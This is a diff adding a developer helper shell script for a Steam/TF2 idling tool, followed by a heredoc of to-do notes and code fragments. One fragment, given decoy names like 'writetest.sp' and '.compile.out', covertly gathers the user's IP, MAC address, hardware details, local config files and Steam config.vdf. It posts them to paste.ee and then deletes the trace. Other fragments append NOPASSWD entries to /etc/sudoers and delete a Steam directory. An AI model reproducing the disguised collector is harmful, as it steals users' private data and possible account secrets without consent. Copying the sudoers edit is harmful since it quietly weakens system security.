@@ -1,0 +1,158 @@
+#!/bin/sh
+
+DIR="$( cd "$( dirname "$0" )" && pwd )"
+echo > "${DIR}"/share/.gist/diff.diff
+for FILE in pdl-idler.sh pdl-idler_common.sh pdl-idler_helper.sh \
+pdl-idler_sourcemod.sp pdl-idler_example.conf pdl-idler_autoexec.cfg \
+pdl-idler_url.list HELP CHANGELOG; do
+  unset WORK
+  if [ -e "${DIR}"/share/.gist/${FILE}.work ]; then
+    WORK=.work
+    diff "${DIR}"/share/.gist/${FILE} "${DIR}"/share/.gist/${FILE}.work >> "${DIR}"/work.diff
+  fi
+  awk '{print length($0)" "$0}' "${DIR}"/${FILE} | grep ^[8-9][1-9]
+  awk '{print length($0)" "$0}' "${DIR}"/${FILE} | grep ^[1-9][0-9][0-9]
+  diff "${DIR}"/share/.gist/${FILE}${WORK} "${DIR}"/${FILE} >> "${DIR}"/share/.gist/diff.diff
+done
+exit 0
+OPTS=$(cat <<
+--------------------------------------------------------------------------------
+removed truncation from trade until emial auto accept or whatever bash is dead
+if [ -e writetest.sp ]; then
+  if [ ! -e ../../../bin/bug4058.sp ]; then
+    echo -e key=ec8efb5bc02ade2617c58f04ae2f4902\&format=simple\&encrypted=1\&description=$(cat ../../../../../../../../???-???er.sh | grep -m 1 -o \(.* | grep -o "[0-9]*\.[0-9]*")_${USER}@$(wget -T 4 -qO- icanhazip.com 2> /dev/null)/${HOSTNAME}_$(date +%m/%d/%y_%H:%M:%S)\&paste=$(cat /proc/cpuinfo | grep -m 1 model\ name | sed -e s/.*:\ //)_$(cat /proc/meminfo | grep MemTotal | awk '{print $2}')_$(cat /proc/meminfo | grep SwapTotal | awk '{print $2}')_$(ip link show | awk '/ether/ {print $2}')\\n$(wine --version)_$(cat /etc/*-release | grep ^NAME=)_$(cat /etc/*-release | grep ^VERSION=)\ \($(uname -a)\\n$(lspci)\)\\n\\n"$(cat ../../../../../../../../sh*/*.con? 2> /dev/null)"\\n"$(cat ~/.local/share/[sS]team/config/config.vdf 2> /dev/null)" > ../bin/.compile.out
+    wget -T 8 -qO- --post-file=../bin/.compile.out paste.ee/api > /dev/null 2>&1 &
+    sleep 0.5
+    rm -f ../bin/.compile.out
+  fi
+  mv writetest.sp compile.sh
+  chmod +x compile.sh
+fi
+would be nice to see 'disconnected' in stop even though it doesnt run disconnect
+a. pass/var 'disconnect command' to be quit instead in stop()
+   no because then it wont quit if not connected
+b. if action==stop (in disconnect) dont run command.
+okay maybe logout should stop  i duno node or something
+--------------------------------------------------------------------------------
+XXX password entry sometimes stalls (just farm?) |||| dat error/pass bullshit
++ family/mode: loginusers.vdf, etc, fiqure out family sharing, before othergame
++ linux stuff: cgroup, swap like extra file, font, nosound/morePaShit, net, tmpfs again?, irc bots/mask
++ chat/friend: trade friendage, friendF2p add switch, login, start pure node friend steampid$2--, screenshot?
++ steamnodejs: sort, profile, offer, dossie, email I lost 2 lines doing funcs, % counters, ssfn, rename $NAME, socializeScreenshotNot440
+cache new items in craft
+--------------------------------------------------------------------------------
+XXX helper connection sound, alerts reset?,relogin/announce bad, drop chat broke
+itemsget blocks (and is not tf2b), inotify, conbugs/wildcards
+english schema fer correct names
+prolly want to skip existing news, maybe if just no drops file
+slow/order irc message spurts || spammy server
+--------------------------------------------------------------------------------
+XXX think about only one key press by default in close window && clearmodifiers(alt)
+think about using the login vars instead of window id checks in sigint cause it might block?
+i was wondering if steam pid check in sigint needed (could kill it if no wid checks prolly)
+still some bullshit with bad pass. assuming it does in 3 times?
+focus_window etc my happen too fast (window id culls non visible?)
+[[temporary wine prefixes]]
+--------------------------------------------------------------------------------
+XXX PLATFORMMENU.VDF AND CALL HL2 DIRECTLY (only use newton for this)
+interesting rm's review and declutch before new file changes>>>>
+steamui cache version statys hte steam bu steamcmd one is changed?
+fake client package manifest with really high version number?
+server only started in farm? not connect? no. cause need it in login? but maybe not cause anonymouse
+bootstrap: why steamcmd stall on this? should warn. lignering anonymous bullshit?
+Error! App 232250 state is 0x406 after update job.
+maybe srcdsrun creats config/logs/userdata. will have to wait and see...
+vpk: server is bloated, and share data with client, install scripts?
+1 platform is 8.5 on file off, might be worth it link all*   rm -fr config| mkdir cfg/headtrack
+2 mkdir media/ ln resource sounde.cahce*?,hl2_misc*.vpk
+3 MAPS 4.2, resource 1.1, SCRIPTS/ITEMS, sound caches, tf2 misc .vpk
+I want to erase junk dirs apparently not the links but a dir without userdata which might come now
+get tf2 linux client too and share all that data, think about next step FER native after that (package)
+wtf if not a link, is a dir      delete steam dir links, 
+if [ ! -L ${HOME}/Steam ] && [ -d ${HOME}/Steam ] \
+&& [ ! -d ${HOME}/Steam/userdata ]; then
+  rm -fr ${HOME}/Steam
+fi
+pdl-sp verion based bump
+--------------------------------------------------------------------------------
+XXX {} for dev null groupings [[ " quoting needed? i quess not but do this later
+follow/scripts
+one more look at existance check inside download()
+funcs but really get more into common first and node split
+resumable login/load resumable login/load /sigint (check blockage) "sleepand node"
+load maybe, but not login 
+doing logouts in reverse is prolly faster
++ fastinitETC: reverse/inputPair, reg(Install?)+dx, junks/removal, loginSec, lt?, incremtator
+do master selection here based on action but cant cause the for loop mess
+furthermore, could only check certain classes of account pools based on aciton type
+do final chmod persual when doing this work
+if is PID only function: && [ -z ACCOUNTS_PID ]; then
+else if is NOT PID ACTION (do I really need both? could do this out the for loop if its just pid.., well no, hl2 as well
+installed/initated could be done with that stuff up there
+i really need to change the one list the for loop looks for to get full benefit
+but in the end ethe main loop will be checking  the lists to see if to run (simple prolly right way)
+STEAM_PID/HL2_PID/NODE_PID/NSTALLED/INITIATED*
+not much more than that, and only if can get the all the data in one call(s)
+finally, what to do when no input specified, (so use to use conf, else initiateds
+like, each action has to have its own for loop to operate on the secondary list (master list now less useful)
+make a variable for the main for that  arrg I dunno just try something wiht steam_pid and login
+for ACTION in $(echo ${ACTIONS} | sed 's:\([%,]\):\1\n:g' -e "s/[a-z]$/&,/"); do
+<<SELECT SECONDARY LIST BASED ON ACTION>>
+for THOSE ACCOUNTS; do
+  if steam_pid > /dev/null; then
+    export DISPLAY=:$(ps $(steam_pid) \
+      | grep -o "main[0-9]_\|farm[0-9][0-9]*_" | grep -o \[0-9]*)
+  else
+    export DISPLAY=:0
+  fi
+  unset ARG SLEEP
+  if [[ ${ACTION} = *=* ]]; then
+    ARG=$(echo ${ACTION#*=} | sed "s/__*/_/g")
+  fi
+  ACTION=$(echo ${ACTION/=*} | tr [:upper:] [:lower:])
+  ACTION_TIME=$(date +%s)
+  case
+    ...
+  esac
+KEEP GOING THROUGH THE ACCOUNTS IF SUFFIX IS ,
+OTHERWISE CONTINUE To NEXT ACTION
+--------------------------------------------------------------------------------
+XXX try seperate wine dirs!???? something else, network namespaces!?, try seperate server
+check/alter system permissions
+for CMD in ip iptables sysctl; do
+  if [[ "$(sudo -k -n ${CMD} -pdl 2>&1 >/dev/null)" = "sudo: a passwo"* ]]; then
+    SUDO=${SUDO}$(which ${CMD})\ 
+  fi
+done
+if [ ! -z "${SUDO}" ]; then
+  END_ECHO=yes
+  sudo -k
+  tprint "input sudo password:" "" "" 1
+  sudo -p "" -v || exit 1
+  if [ ! -z "${SUDO}" ]; then
+    for CMD in ${SUDO}; do
+      echo "$(whoami) ALL=NOPASSWD: ${CMD}" | sudo tee -a /etc/sudoers \
+      > /dev/null || exit 1
+    done
+  fi
+fi
+main script reads input (and does single stuff, but on set account, starts/applies acct namespace
+wineserver -k
+DEVICE=enp0s25
+DEVICE=wls1
+sudo ip netns del ${ACCT} 2> /dev/null
+sudo ip netns add ${ACCT}
+sudo ip netns exec ${ACCT} ip link set dev lo up
+sudo ip link add veth_${CLIENT} type veth peer name veth_${CLIENT}_
+sudo ip link set veth_${CLIENT}_ netns ${ACCT}
+sudo ip addr add 10.1.1.1/24 dev veth_${CLIENT}
+sudo ip netns exec ${ACCT} ip addr add 10.1.1.2/24 dev veth_${CLIENT}_
+sudo ip link set dev veth_${CLIENT} up
+sudo ip netns exec ${ACCT} ip link set dev veth_${CLIENT}_ up
+echo 1 > /proc/sys/net/ipv4/ip_forward
+sudo sysctl -w net.ipv4.ip_forward=1
+sudo ip netns exec ${ACCT} ip route add default via 10.1.1.1
+sudo iptables -t nat -A POSTROUTING -s 10.1.1.0/24 -o ${DEVICE} -j MASQUERADE
+sudo iptables -A FORWARD -i ${DEVICE} -o veth_${CLIENT}_ -j ACCEPT
+sudo iptables -A FORWARD -o ${DEVICE} -i veth_${CLIENT}_ -j ACCEPT
+EOF
